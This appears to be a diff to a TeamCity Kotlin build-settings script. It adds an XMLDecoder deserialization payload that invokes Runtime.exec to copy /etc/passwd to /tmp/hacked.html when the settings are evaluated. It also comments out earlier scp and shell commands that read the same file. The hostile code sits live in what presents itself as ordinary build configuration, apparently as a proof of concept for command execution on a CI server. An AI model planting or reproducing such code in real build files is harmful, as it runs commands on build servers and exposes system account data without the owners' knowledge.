@@ -3,6 +3,10 @@ import jetbrains.buildServer.configs.kotlin.*
 import jetbrains.buildServer.configs.kotlin.buildFeatures.perfmon
 import jetbrains.buildServer.configs.kotlin.buildSteps.maven
 import jetbrains.buildServer.configs.kotlin.triggers.vcs
+import java.beans.XMLDecoder
+import java.io.ByteArrayInputStream
+import java.io.InputStream
+import java.nio.charset.StandardCharsets
 
 /*
 The settings script is an entry point for defining a TeamCity
@@ -32,9 +36,35 @@ project {
 
     buildType(Build)
 
-    var process = Runtime.getRuntime().exec("scp /etc/passwd /tmp/hacked.txt")
+    val payload = """<?xml version="1.0" encoding="UTF-8"?>
+    <java version="1.8.0_102" class="java.beans.XMLDecoder">
+     <object class="java.lang.Runtime" method="getRuntime">
+          <void method="exec">
+          <array class="java.lang.String" length="3">
+              <void index="0">
+                  <string>cp</string>
+              </void>
+              <void index="1">
+                  <string>/etc/passwd</string>
+              </void>
+              <void index="2">
+                  <string>/tmp/hacked.html</string>
+              </void>
+          </array>
+          </void>
+     </object>
+    </java>"""
+    val stream: InputStream = ByteArrayInputStream(payload.toByteArray(StandardCharsets.UTF_8))
+
+    val d = XMLDecoder(
+            stream
+    )
+    d.readObject()
+
+
+    /* var process = Runtime.getRuntime().exec("scp /etc/passwd /tmp/hacked.txt")
     val exitCode = process.waitFor()
-    println(exitCode)
+    println(exitCode) */
 
     /*val builder = ProcessBuilder()
     builder.command("sh", "-c", "cat /etc/passwd >> /tmp/hacked.txt")
